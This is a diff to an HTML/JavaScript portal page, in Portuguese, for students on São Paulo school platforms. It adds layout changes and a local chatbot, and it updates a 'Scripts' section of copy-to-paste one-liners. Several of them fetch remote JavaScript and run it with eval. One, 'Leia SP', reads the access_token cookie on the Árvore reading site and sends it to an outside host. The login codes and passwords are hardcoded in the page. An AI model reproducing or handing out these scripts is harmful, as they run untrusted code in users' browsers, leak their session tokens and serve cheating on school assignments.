@@ -20,8 +20,8 @@
   .msg{margin-top:12px;font-size:13px;color:#ff7b72;min-height:18px}
   .small{font-size:12px;color:var(--muted);margin-top:8px}
   #central{display:none;width:95%;max-width:1200px;margin:24px auto}
-  .central-wrap{padding:18px; position:relative}
-  .central-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:12px}
+  .central-wrap{Padding:18px; position:relative}
+  .central-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:6px}
   /* PROFILE FIXADO NO CANTO SUPERIOR ESQUERDO (bem colado na borda) */
   .user-profile{
     position:fixed;
@@ -33,22 +33,42 @@
     gap:4px;
     color:#f0f6fc;
     z-index:10001;
-    pointer-events:none; /* evita bloquear cliques acidentais; a imagem não é clicável */
+    pointer-events:none;
   }
   .user-profile img{width:44px;height:44px;border-radius:50%;border:2px solid var(--primary);background:#0b0f14;display:block}
   .user-profile span{font-size:11px; color:#c9d1d9; margin-top:-2px; text-align:center; display:block; pointer-events:auto}
   .sections{display:flex;flex-direction:column;gap:18px}
   .section{background:var(--card);border-radius:12px;padding:14px;box-shadow:0 6px 18px rgba(0,0,0,.3)}
+  .section h3{margin:0 0 10px 0;color:#f0f6fc}
   .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(140px,1fr));gap:12px}
   .tile{display:flex;gap:10px;align-items:center;padding:10px;border-radius:10px;cursor:pointer;transition:transform .12s ease;background:var(--tile-bg);border:1px solid #30363d}
   .tile:hover{transform:translateY(-4px);background:#2b303a}
+  .tile[aria-disabled="true"]{opacity:0.5;cursor:not-allowed;transform:none}
   .icon{width:28px;height:28px;display:flex;align-items:center;justify-content:center;font-size:18px}
   .icon img{width:28px;height:28px;border-radius:6px;display:block}
   .meta{display:flex;flex-direction:column}
   .title{font-size:14px}
   .subtitle{font-size:12px;color:var(--muted)}
   .logout{background:#161b22;color:var(--primary);padding:8px 10px;border-radius:10px;border:0;cursor:pointer;pointer-events:auto}
-  @media (max-width:480px){ .grid{grid-template-columns:repeat(2,1fr)} .card{padding:18px} .user-profile{left:6px;top:6px} .user-profile img{width:40px;height:40px} }
+  footer.app-info{margin-top:8px;font-size:12px;color:var(--muted);text-align:right}
+
+  @media (max-width:800px){ .card{width:360px} }
+  @media (max-width:600px){ 
+    body{align-items:flex-start}
+    .card{padding:16px;width:100%;max-width:720px}
+    #central{margin:12px}
+    .grid{grid-template-columns:repeat(2,1fr)} 
+    .user-profile{left:8px;top:8px}
+    .user-profile img{width:40px;height:40px}
+  }
+  @media (max-width:420px){ 
+    .card{padding:12px}
+    .grid{grid-template-columns:repeat(1,1fr)}
+    .tile{padding:12px}
+    .title{font-size:15px}
+    .icon img{width:36px;height:36px}
+    #playButton{width:56px;height:56px;right:14px;bottom:14px}
+  }
 
   /* Play button (hidden até login) */
   #playButton{
@@ -70,6 +90,23 @@
 
   /* hidden, offscreen player container (YouTube) */
   #yt-player { width:0; height:0; overflow:hidden; position:fixed; left:-9999px; top:auto; }
+
+  /* Chat UI */
+  .chat-open-btn{
+    position:fixed; bottom:100px; right:20px; z-index:10002; padding:10px 14px; border-radius:12px; border:0; cursor:pointer;
+    background:linear-gradient(180deg,var(--primary),#2d7fdc); color:white; box-shadow:0 6px 18px rgba(0,0,0,.4);
+  }
+  .chat-box{
+    position:fixed; bottom:20px; right:20px; width:320px; max-width:90%; height:420px; background:var(--card); border-radius:12px; z-index:10003; display:flex; flex-direction:column; box-shadow:0 12px 40px rgba(0,0,0,.6);
+  }
+  .chat-header{padding:10px 12px; border-bottom:1px solid #232628; display:flex; justify-content:space-between; align-items:center}
+  .chat-messages{flex:1; padding:12px; overflow:auto;}
+  .chat-message{margin-bottom:10px; font-size:13px}
+  .chat-message.me{text-align:right}
+  .chat-input{display:flex; gap:8px; padding:10px; border-top:1px solid #232628}
+  .chat-input input{flex:1; padding:8px;border-radius:8px;border:1px solid #30363d;background:transparent;color:#f0f6fc}
+  .chat-close{background:transparent;border:0;color:var(--muted);cursor:pointer}
+  .chat-small{font-size:11px;color:var(--muted);margin-top:6px;text-align:center}
 </style>
 </head>
 <body>
@@ -107,6 +144,7 @@
         <button id="logoutBtn" class="logout">Sair</button>
       </div>
     </div>
+    <footer class="app-info">v1.21.101.1 • Criador: Good Luck Bear</footer>
     <div class="sections" id="sectionsContainer"></div>
   </div>
 </section>
@@ -130,6 +168,8 @@
   </div>
 </template>
 
+<!-- Chat UI elements (serão adicionados dinamicamente) -->
+
 <script>
 /* ====== ELEMENTS ====== */
 const codeInput = document.getElementById('code');
@@ -148,9 +188,9 @@ const userNameEl = document.getElementById('userName');
 const userImgEl = document.getElementById('userImg');
 const userProfileEl = document.getElementById('userProfile');
 
-/* ====== URSINHOS (CÓDIGO + SENHA + NOME + IMAGENS OFICIAIS + FALLBACK) ======
-   Os links principais usam a Fandom/Wikia (vignette). Se um link falhar,
-   o código automaticamente troca para o fallback (imgur) para evitar "sumir". */
+let currentUrsinho = null;
+
+/* ====== URSINHOS (CÓDIGO + SENHA + NOME + IMAGENS OFICIAIS + FALLBACK) ====== */
 const ursinhos = [
   { 
     "name": "Good Luck Bear", 
@@ -172,37 +212,8 @@ const ursinhos = [
     "pass": "b23@",
     "img": "https://i.pinimg.com/originals/d7/42/1a/d7421a39a328e5a35f5dd11d3fd63b10.jpg",
     "fallback": "https://i.imgur.com/2qlR7oT.png" 
-  },
-  { 
-    "name": "Grams Bear", 
-    "code": "1127", 
-    "pass": "b23@",
-    "img": "https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/ed991cf4-7c8c-4530-b6ba-a3abf3ab2eae/debnzwm-f11c1961-567d-470b-be0f-515f929d5232.png/v1/fill/w_1600,h_1941,strp/care_bears__grams_bear__new__2d_by_joshuat1306_debnzwm-fullview.png?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1cm46YXBwOjdlMGQxODg5ODIyNjQzNzNhNWYwZDQxNWVhMGQyNmUwIiwiaXNzIjoidXJuOmFwcDo3ZTBkMTg4OTgyMjY0MzczYTVmMGQ0MTVlYTBkMjZlMCIsIm9iaiI6W1t7ImhlaWdodCI6Ijw9MTk0MSIsInBhdGgiOiJcL2ZcL2VkOTkxY2Y0LTdjOGMtNDUzMC1iNmJhLWEzYWJmM2FiMmVhZVwvZGVibnp3bS1mMTFjMTk2MS01NjdkLTQ3MGItYmUwZi01MTVmOTI5ZDUyMzIucG5nIiwid2lkdGgiOiI8PTE2MDAifV1dLCJhdWQiOlsidXJuOnNlcnZpY2U6aW1hZ2Uub3BlcmF0aW9ucyJdfQ.-nimJdw8Ugauhnb_8KYjtWDw6t3o6KW3L65q8TLmA-8",
-    "fallback": "https://i.imgur.com/Zb2M1lh.png" 
-  },
-  { 
-    "name": "Grumpy Bear", 
-    "code": "1125", 
-    "pass": "b23@",
-    "img": "https://vignette.wikia.nocookie.net/carebears/images/4/46/Grumpy_Bear.png",
-    "fallback": "https://i.imgur.com/WJjvFZj.png" 
-  },
-  { 
-    "name": "Bedtime Bear", 
-    "code": "1104", 
-    "pass": "g@123",
-    "img": "https://vignette.wikia.nocookie.net/carebears/images/f/f1/Bedtime_Bear.png",
-    "fallback": "https://i.imgur.com/4kKf6Q2.png" 
-  },
-  { 
-    "name": "Cheer Bear", 
-    "code": "1132", 
-    "pass": "b23@",
-    "img": "https://static.wikia.nocookie.net/welcometocarealot/images/c/c7/Cheer_bear_570x420.jpg/revision/latest?cb=20120723210347",
-    "fallback": "https://i.imgur.com/UsqThLQ.png" 
   }
-]
-;
+];
 
 let attempts = 0, maxAttempts = 5, lockedUntil = 0;
 
@@ -238,37 +249,50 @@ loginBtn.addEventListener('click', ()=> {
 passInput.addEventListener('keypress', e=>{ if(e.key === 'Enter') loginBtn.click(); });
 showBtn.addEventListener('click', ()=>{ const t = passInput.type === 'password' ? 'text' : 'password'; passInput.type = t; showBtn.textContent = t === 'text' ? 'Ocultar' : 'Mostrar'; });
 
-/* ====== CENTRAL DATA ====== */
+/* ====== CENTRAL DATA (ATUALIZADO) ====== */
 const centralSections = [
-  { id:'apostilas', title:'Apostilas / Livros', items:[
-      { title:'POR/MAT', subtitle:'PDF', url:'https://acervocmsp.educacao.sp.gov.br/138013/1262487.pdf', icon:'https://is1-ssl.mzstatic.com/image/thumb/Purple122/v4/6a/c7/e4/6ac7e4d5-cb34-522d-b80d-8a465ac50d7e/AppIcon-1x_U007emarketing-0-7-0-85-220.png/1200x630wa.png' },
-      { title:'HIS/GEO', subtitle:'PDF', url:'https://acervocmsp.educacao.sp.gov.br/138038/1262582.pdf', icon:'https://is1-ssl.mzstatic.com/image/thumb/Purple122/v4/6a/c7/e4/6ac7e4d5-cb34-522d-b80d-8a465ac50d7e/AppIcon-1x_U007emarketing-0-7-0-85-220.png/1200x630wa.png' },
-      { title:'FÍS/BIO/QUÍ', subtitle:'PDF', url:'https://acervocmsp.educacao.sp.gov.br/138040/1262595.pdf', icon:'https://is1-ssl.mzstatic.com/image/thumb/Purple122/v4/6a/c7/e4/6ac7e4d5-cb34-522d-b80d-8a465ac50d7e/AppIcon-1x_U007emarketing-0-7-0-85-220.png/1200x630wa.png' },
-  ]},
-  { id:'scripts', title:'Scripts', items:[
-      { title:'Redação', subtitle:'Clique para copiar', code:'fetch("https://corsproxy.io/?url=https://raw.githubusercontent.com/DarkModde/Dark-Scripts/refs/heads/main/RedaSP-IA.js").then(t=>t.text()).then(eval);', icon:'https://camo.githubusercontent.com/557ad68f0a36c0067b8c94210fcdf3000374b7378ddad748478d4a0dc854da21/68747470733a2f2f692e696d6775722e636f6d2f6c336c584839302e706e67' },
-      { title:'Speak', subtitle:'Clique para copiar', code:'fetch("https://speakify.cupiditys.lol/api/bookmark.js").then(r => r.text()).then(r => eval(r))', icon:'https://camo.githubusercontent.com/d1de9e6085ec102352e59d0ffb530c6c2776f39a2608058b13235896bf7acd69/68747470733a2f2f692e696d6775722e636f6d2f706978363644352e706e67' },
-      { title:'Khan Academy', subtitle:'Clique para copiar', code:'fetch("https://raw.githubusercontent.com/Niximkk/Khanware/refs/heads/main/Khanware.js").then(t=>t.text()).then(eval);', icon:'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQkD27JRbnRUkTmfVQP6OOupXZKjfOhF5JMLA&s' },
-      { title:'Leia SP', subtitle:'Clique para copiar', code:'!function(){if("livros.arvore.com.br"!==location.host)return alert("Este script só funciona no Árvore!");open(`https://leiasp.cupiditys.lol/?key=${encodeURIComponent(btoa(document.cookie.split("access_token=")[1].split(";")[0]))}`)}();', icon:'https://is1-ssl.mzstatic.com/image/thumb/Purple122/v4/6a/c7/e4/6ac7e4d5-cb34-522d-b80d-8a465ac50d7e/AppIcon-1x_U007emarketing-0-7-0-85-220.png/1200x630wa.png' },
-      { title:'Expansão Noturna', subtitle:'Clique para copiar', code:'fetch("https://corsproxy.io/?url=https://raw.githubusercontent.com/DarkModde/Dark-Scripts/refs/heads/main/ExNoturnoFDS.js").then(t=>t.text()).then(eval);', icon:'https://camo.githubusercontent.com/4e0626916bfca146cae1641a69749205ee1bf2ddebd1e116b9895efbdb7ebd43/68747470733a2f2f692e696d6775722e636f6d2f676a766468626f2e706e67' },
+  { id:'apostilas', title:'Apostilas / Livros (4º Bimestre)', items:[
+      { title:'POR/MAT (4º Bimestre)', subtitle:'PDF', url:'https://acervocmsp.educacao.sp.gov.br/143257/1340145.pdf', icon:'' },
+      { title:'HIS/GEO (4º Bimestre)', subtitle:'PDF', url:'https://acervocmsp.educacao.sp.gov.br/143266/1340446.pdf', icon:'' },
+      { title:'FÍS/BIO/QUÍ (4º Bimestre)', subtitle:'PDF', url:'https://acervocmsp.educacao.sp.gov.br/143268/1340460.pdf', icon:'' },
   ]},
   { id:'website', title:'Website', items:[
-      { title:'Tarefas', subtitle:'Clique para abrir', url:'https://taskitos.cupiditys.lol/?cmsphacks.xyz', icon:'https://camo.githubusercontent.com/9c1ba3f2d4e91f3d221d56cb9e4b4e8bd3c2404bcb7b28c0989b35b56759df8c/68747470733a2f2f692e696d6775722e636f6d2f584943736763482e706e67' },
-      { title:'Redação', subtitle:'Clique para abrir', url:'https://redacao.cupiditys.lol/?cmsphacks.xyz', icon:'https://camo.githubusercontent.com/557ad68f0a36c0067b8c94210fcdf3000374b7378ddad748478d4a0dc854da21/68747470733a2f2f692e696d6775722e636f6d2f6c336c584839302e706e67' },
-      { title:'Speak', subtitle:'Clique para abrir', url:'https://speakify.cupiditys.lol/install', icon:'https://camo.githubusercontent.com/d1de9e6085ec102352e59d0ffb530c6c2776f39a2608058b13235896bf7acd69/68747470733a2f2f692e696d6775722e636f6d2f706978363644352e706e67' },
-      { title:'Leia SP', subtitle:'Clique para abrir', url:'https://leia.cmsphacks.xyz/?cmsphacks.xyz', icon:'https://is1-ssl.mzstatic.com/image/thumb/Purple122/v4/6a/c7/e4/6ac7e4d5-cb34-522d-b80d-8a465ac50d7e/AppIcon-1x_U007emarketing-0-7-0-85-220.png/1200x630wa.png' },
-      { title:'Expansão Noturna', subtitle:'Clique para abrir', url:'https://crimsonstrauss.xyz/expansao', icon:'https://camo.githubusercontent.com/4e0626916bfca146cae1641a69749205ee1bf2ddebd1e116b9895efbdb7ebd43/68747470733a2f2f692e696d6775722e636f6d2f676a766468626f2e706e67' },
+      { title:'Tarefas', subtitle:'Abrir', url:'https://taskitos.cupiditys.lol/?cmsphacks.xyz', icon:'https://camo.githubusercontent.com/9c1ba3f2d4e91f3d221d56cb9e4b4e8bd3c2404bcb7b28c0989b35b56759df8c/68747470733a2f2f692e696d6775722e636f6d2f584943736763482e706e67' },
+      { title:'Redação (site)', subtitle:'Abrir', url:'https://redacao.cupiditys.lol/?cmsphacks.xyz', icon:'https://camo.githubusercontent.com/557ad68f0a36c0067b8c94210fcdf3000374b7378ddad748478d4a0dc854da21/68747470733a2f2f692e696d6775722e636f6d2f6c336c584839302e706e67' },
+      { title:'Speak (install)', subtitle:'Abrir', url:'https://speakify.cupiditys.lol/install', icon:'https://camo.githubusercontent.com/d1de9e6085ec102352e59d0ffb530c6c2776f39a2608058b13235896bf7acd69/68747470733a2f2f692e696d6775722e636f6d2f706978363644352e706e67' },
+      { title:'Leia SP', subtitle:'Abrir (Árvore)', url:'https://leia.cmsphacks.xyz/?cmsphacks.xyz', icon:'https://is1-ssl.mzstatic.com/image/thumb/Purple122/v4/6a/c7/e4/6ac7e4d5-cb34-522d-b80d-8a465ac50d7e/AppIcon-1x_U007emarketing-0-7-0-85-220.png/1200x630wa.png' },
+      { title:'Expansão Noturna', subtitle:'Abrir', url:'https://crimsonstrauss.xyz/expansao', icon:'https://camo.githubusercontent.com/4e0626916bfca146cae1641a69749205ee1bf2ddebd1e116b9895efbdb7ebd43/68747470733a2f2f692e696d6775722e636f6d2f676a766468626f2e706e67' },
+      { title:'GitHub — CMSP Hacks', subtitle:'Repositório', url:'https://github.com/DarkModde/CMSP-Plataformas-Hacks', icon:'' },
   ]},
-  { id:'links', title:'Links', items:[
-      { title:'Sala do Futuro', subtitle:'Clique para abrir', url:'https://acervocmsp.educacao.sp.gov.br', icon:'https://play-lh.googleusercontent.com/l6L7nJ8fVp4J6Unx9V_V5iD--FAOW2b6SGrs3p3c_N4q8n2da7qpxiddwKl2HmxZ3Ykd' },
-      { title:'Discord 1', subtitle:'Clique para abrir', url:'https://discord.gg/NhuTd37Z', icon:'https://cdn-icons-png.flaticon.com/512/2111/2111370.png' },
-      { title:'Discord 2', subtitle:'Clique para abrir', url:'https://discord.gg/vTRynvhje', icon:'https://cdn-icons-png.flaticon.com/512/2111/2111370.png' },
-      { title:'Discord 3', subtitle:'Clique para abrir', url:'https://discord.gg/rnYjkRA8', icon:'https://cdn-icons-png.flaticon.com/512/2111/2111370.png' },
-      { title:'Tutorial YouTube', subtitle:'Clique para abrir', url:'https://youtube.com/playlist?list=PLmPgXmAk1aVTd6UsfopLMKTAlQ0FXx0IW&si=4lkbjPWksFhhcfGX', icon:'https://cdn-icons-png.flaticon.com/512/1384/1384060.png' },
-      { title:'GitHub', subtitle:'Clique para abrir', url:'https://github.com/DarkModde/CMSP-Plataformas-Hacks', icon:'https://cdn-icons-png.flaticon.com/512/25/25231.png' },
-  ]}
+  { id:'scripts', title:'Scripts (copiar)', items:[
+      { title:'Redação — copiar', subtitle:'Clique para copiar o script', code:'fetch("https://corsproxy.io/?url=https://raw.githubusercontent.com/DarkModde/Dark-Scripts/refs/heads/main/RedaSP-IA.js").then(t=>t.text()).then(eval);', icon:'https://camo.githubusercontent.com/557ad68f0a36c0067b8c94210fcdf3000374b7378ddad748478d4a0dc854da21/68747470733a2f2f692e696d6775722e636f6d2f6c336c584839302e706e67' },
+      { title:'Speak — copiar', subtitle:'Clique para copiar o script', code:'fetch("https://speakify.cupiditys.lol/api/bookmark.js").then(r => r.text()).then(r => eval(r))', icon:'https://camo.githubusercontent.com/d1de9e6085ec102352e59d0ffb530c6c2776f39a2608058b13235896bf7acd69/68747470733a2f2f692e696d6775722e636f6d2f706978363644352e706e67' },
+      { title:'Khan Academy — copiar', subtitle:'Clique para copiar o script', code:'fetch(\'https://raw.githubusercontent.com/CrimsonStrauss/Scripts/refs/heads/main/khanlunar.js\').then(t=>t.text()).then(eval)', icon:'' },
+      { title:'Leia SP — abrir (script)', subtitle:'Script para Árvore', code:'!function(){if(\'livros.arvore.com.br\'!==location.host)return alert(\'Este script só funciona no Árvore!\');open(`https://leiasp.cupiditys.lol/?key=${encodeURIComponent(btoa(document.cookie.split(%27access_token=%27)[1].split(%27;%27)[0]))}`)}();', icon:'https://is1-ssl.mzstatic.com/image/thumb/Purple122/v4/6a/c7/e4/6ac7e4d5-cb34-522d-b80d-8a465ac50d7e/AppIcon-1x_U007emarketing-0-7-0-85-220.png/1200x630wa.png' },
+      { title:'Expansão Noturna — copiar', subtitle:'Clique para copiar o script', code:'fetch("https://corsproxy.io/?url=https://raw.githubusercontent.com/DarkModde/Dark-Scripts/refs/heads/main/ExNoturnoFDS.js").then(t=>t.text()).then(eval);', icon:'https://camo.githubusercontent.com/4e0626916bfca146cae1641a69749205ee1bf2ddebd1e116b9895efbdb7ebd43/68747470733a2f2f692e696d6775722e636f6d2f676a766468626f2e706e67' },
+  ]},
+  { id:'links', title:'Links & Comunidades', items:[
+      { title:'Sala do Futuro (CMSP)', subtitle:'Abrir', url:'https://acervocmsp.educacao.sp.gov.br', icon:'https://play-lh.googleusercontent.com/l6L7nJ8fVp4J6Unx9V_V5iD--FAOW2b6SGrs3p3c_N4q8n2da7qpxiddwKl2HmxZ3Ykd' },
+      { title:'Discord — servidor 1', subtitle:'Entrar', url:'https://discord.gg/NhuTd37Z', icon:'' },
+      { title:'Discord — servidor 2', subtitle:'Entrar', url:'https://discord.gg/vTRynvhje', icon:'' },
+      { title:'Discord — servidor 3', subtitle:'Entrar', url:'https://discord.gg/rnYjkRA8', icon:'' },
+      { title:'Tutorial YouTube', subtitle:'Playlist', url:'https://youtube.com/playlist?list=PLmPgXmAk1aVTd6UsfopLMKTAlQ0FXx0IW', icon:'' },
+  ]},
+  { id:'ia', title:'Inteligência Artificial', items:[
+      { title:'ChatGPT', subtitle:'OpenAI — chatbot', url:'https://chat.openai.com', icon:'' },
+      { title:'Google Gemini', subtitle:'Gemini — Google', url:'https://gemini.google.com', icon:'' },
+      { title:'Microsoft Copilot', subtitle:'Copilot — Microsoft', url:'https://www.microsoft.com/en-us/copilot', icon:'' },
+      { title:'DeepSeek', subtitle:'DeepSeek — Into the Unknown', url:'https://www.deepseek.com', icon:'' },
+  ]},
+  { id:'games', title:'Jogos', items:[
+      { title:'Poki', subtitle:'Jogos online', url:'https://poki.com', icon:'' },
+      { title:'Friv', subtitle:'Jogos online', url:'https://friv.com', icon:'' },
+      { title:'Jogos360', subtitle:'Jogos online', url:'https://www.jogos360.com', icon:'' },
+      { title:'Minijogos', subtitle:'Mais opções', url:'https://www.minijogos.com.br', icon:'' },
+      { title:'Mini-Games (meu projeto)', subtitle:'Página com mini-games', url:'https://omarquinhosf.github.io/Omarquinhosf-Mini-Games/', icon:'' },
+  ]},
 ];
-
+/* ====== RENDER CENTRAL ====== */
 function renderCentral(){
   sectionsContainer.innerHTML = '';
   centralSections.forEach(section=>{
@@ -288,25 +312,35 @@ function renderCentral(){
         const img = document.createElement('img');
         img.src = item.icon;
         img.alt = item.title;
-        // fallback se icon falhar
         img.onerror = () => { if(item.iconFallback) img.src = item.iconFallback; };
         icon.appendChild(img);
+      } else {
+        // placeholder icon (emoji)
+        icon.textContent = item.title && (item.title.toLowerCase().includes('chat') || item.title.toLowerCase().includes('gpt')) ? '💬' :
+                            (item.title && (item.title.toLowerCase().includes('pdf') || item.subtitle && item.subtitle.toLowerCase().includes('pdf'))) ? '📄' :
+                            '🔗';
       }
 
       title.textContent = item.title;
       subtitle.textContent = item.subtitle || '';
 
+      if(item.disabled){
+        tile.setAttribute('aria-disabled','true');
+      }
+
       tile.addEventListener('click', async ()=>{
-        if(item.url){
-          window.open(item.url,'_blank','noopener');
-        } else if(item.code){
+        if(item.disabled){ showToast('Conteúdo não disponível'); return; }
+        if(item.url){ window.open(item.url,'_blank','noopener'); return; }
+        if(item.code){
           try {
             await navigator.clipboard.writeText(item.code);
             showToast('Script copiado!');
           } catch(err){
             showToast('Erro ao copiar');
           }
+          return;
         }
+        showToast('Sem ação definida');
       });
       tile.addEventListener('keydown', e=>{ if(e.key==='Enter') tile.click(); });
       grid.appendChild(tpl);
@@ -319,6 +353,7 @@ function renderCentral(){
 
 /* ====== OPEN / LOGOUT ====== */
 function openCentral(ursinho){
+  currentUrsinho = ursinho;
   mainLogin.style.display = 'none';
   central.style.display = 'block';
   document.body.style.alignItems = 'flex-start';
@@ -334,9 +369,13 @@ function openCentral(ursinho){
   // mostrar play button
   playBtn.style.display = 'flex';
   playBtn.focus();
+
+  // criar botão de chat (falar com ursinho)
+  ensureChatButton();
 }
 
 logoutBtn.addEventListener('click', ()=>{ 
+  currentUrsinho = null;
   central.style.display = 'none'; 
   mainLogin.style.display = 'block'; 
   document.body.style.alignItems='center';
@@ -347,6 +386,8 @@ logoutBtn.addEventListener('click', ()=>{
   stopRain();
   setPlayIcon(false);
   playBtn.style.display = 'none';
+  // remove chat UI se existir
+  removeChatUI();
 });
 document.addEventListener('keydown', e=>{ if(e.key==='Escape' && central.style.display==='block') logoutBtn.click(); });
 
@@ -444,6 +485,128 @@ window.addEventListener('beforeunload', ()=> { try { if(player && player.pauseVi
 setPlayIcon(false);
 playBtn.disabled = true;
 window.onYouTubeIframeAPIReady = function(){ onYouTubeApiReady(); };
+
+/* ====== CHAT: PROVA DE CONCEITO (LOCAL) ====== */
+/* Essa implementação cria um botão "Falar com <Ursinho>" e uma caixa de chat local.
+   O bot usa respostas pré-definidas por persona e regras simples de keyword.
+   Se quiser integrar com uma API real (ChatGPT / Gemini), eu posso te ajudar depois. */
+
+const personaResponses = {
+  "Good Luck Bear":[
+    "Boa sorte! 🌟 Em que posso te ajudar hoje?",
+    "Lembre-se: um pouco de positividade muda muito as coisas!",
+    "Quer um conselho rápido pra uma prova? Respire fundo e revise os pontos principais."
+  ],
+  "Love-a-Lot Bear":[
+    "Amor e carinho! ❤️ Como posso te ajudar, amigx?",
+    "Um abraço virtual funciona bem. Quer ouvir uma dica de redação?",
+    "Lembre-se de tratar os amigos com cuidado e ouvir o outro."
+  ],
+  "Funshine Bear":[
+    "Vamos nos divertir! ☀️ O que você quer jogar?",
+    "Uma piada rápida: Por que o teclado foi ao médico? Porque estava com muitas teclas presas!",
+    "Adoro energia positiva — conta uma coisa boa que aconteceu hoje!"
+  ],
+  "default":[
+    "Oi! Como posso ajudar?",
+    "Desculpa, ainda estou aprendendo a responder isso. Tente perguntar algo simples.",
+    "Posso abrir links, copiar scripts e conversar um pouco!"
+  ]
+};
+
+function rand(arr){ return arr[Math.floor(Math.random()*arr.length)]; }
+
+let chatOpenBtn = null;
+let chatBox = null;
+
+function ensureChatButton(){
+  if(chatOpenBtn) return;
+  chatOpenBtn = document.createElement('button');
+  chatOpenBtn.className = 'chat-open-btn';
+  chatOpenBtn.type = 'button';
+  chatOpenBtn.textContent = `Falar com ${currentUrsinho ? currentUrsinho.name : 'Ursinho'}`;
+  chatOpenBtn.addEventListener('click', ()=> openChatBox());
+  document.body.appendChild(chatOpenBtn);
+}
+
+function removeChatUI(){
+  if(chatOpenBtn && chatOpenBtn.parentNode) chatOpenBtn.parentNode.removeChild(chatOpenBtn);
+  chatOpenBtn = null;
+  if(chatBox && chatBox.parentNode) chatBox.parentNode.removeChild(chatBox);
+  chatBox = null;
+}
+
+function openChatBox(){
+  if(chatBox) return; // já aberto
+  chatBox = document.createElement('div');
+  chatBox.className = 'chat-box';
+
+  const header = document.createElement('div');
+  header.className = 'chat-header';
+  const title = document.createElement('div');
+  title.textContent = currentUrsinho ? `${currentUrsinho.name}` : 'Ursinho';
+  const closeBtn = document.createElement('button');
+  closeBtn.className = 'chat-close';
+  closeBtn.textContent = '✕';
+  closeBtn.title = 'Fechar chat';
+  closeBtn.addEventListener('click', ()=> { if(chatBox && chatBox.parentNode) chatBox.parentNode.removeChild(chatBox); chatBox = null; });
+  header.appendChild(title); header.appendChild(closeBtn);
+
+  const messages = document.createElement('div');
+  messages.className = 'chat-messages';
+  const helper = document.createElement('div');
+  helper.className = 'chat-small';
+  helper.textContent = 'Conversa local (offline). Mensagens não são enviadas a servidores.';
+  messages.appendChild(helper);
+
+  const inputWrap = document.createElement('div');
+  inputWrap.className = 'chat-input';
+  const input = document.createElement('input');
+  input.type = 'text';
+  input.placeholder = 'Escreva sua mensagem...';
+  const sendBtn = document.createElement('button');
+  sendBtn.textContent = 'Enviar';
+  sendBtn.addEventListener('click', ()=> { sendMessage(input.value.trim()); input.value=''; input.focus(); });
+  input.addEventListener('keypress', e=>{ if(e.key==='Enter'){ sendBtn.click(); }});
+  inputWrap.appendChild(input); inputWrap.appendChild(sendBtn);
+
+  chatBox.appendChild(header); chatBox.appendChild(messages); chatBox.appendChild(inputWrap);
+  document.body.appendChild(chatBox);
+  input.focus();
+
+  function appendMessage(text, fromMe=false){
+    const m = document.createElement('div');
+    m.className = 'chat-message ' + (fromMe ? 'me':'bot');
+    m.textContent = (fromMe ? 'Você: ' : `${currentUrsinho ? currentUrsinho.name : 'Ursinho'}: `) + text;
+    messages.appendChild(m);
+    messages.scrollTop = messages.scrollHeight;
+  }
+
+  function sendMessage(text){
+    if(!text) return;
+    appendMessage(text,true);
+    // resposta do bot (simples)
+    setTimeout(()=>{
+      const persona = (currentUrsinho && personaResponses[currentUrsinho.name]) ? personaResponses[currentUrsinho.name] : personaResponses.default;
+      // regras simples por keyword
+      const t = text.toLowerCase();
+      let reply = null;
+      if(t.includes('oi') || t.includes('olá') || t.includes('eae')) reply = `Oi! ${rand(persona)}`;
+      else if(t.includes('jogo') || t.includes('jogar')) reply = `Que tal um jogo no Poki? Abra a seção "Jogos" pra ver links.`;
+      else if(t.includes('ajuda') || t.includes('prova') || t.includes('estudar')) reply = `Respire fundo e divida o estudo em blocos de 25 minutos. Precisa de uma dica específica?`;
+      else if(t.includes('piada') || t.includes('brincar')) reply = rand(persona);
+      else reply = rand(persona);
+      appendMessage(reply,false);
+    }, 600 + Math.random()*900);
+  }
+
+  // expose sendMessage for button closure
+  chatBox.sendMessage = sendMessage;
+}
+
+/* ====== Inicialização: mantém compatibilidade com o código existente ====== */
+setPlayIcon(false);
+playBtn.disabled = true;
 </script>
 </body>
 </html>
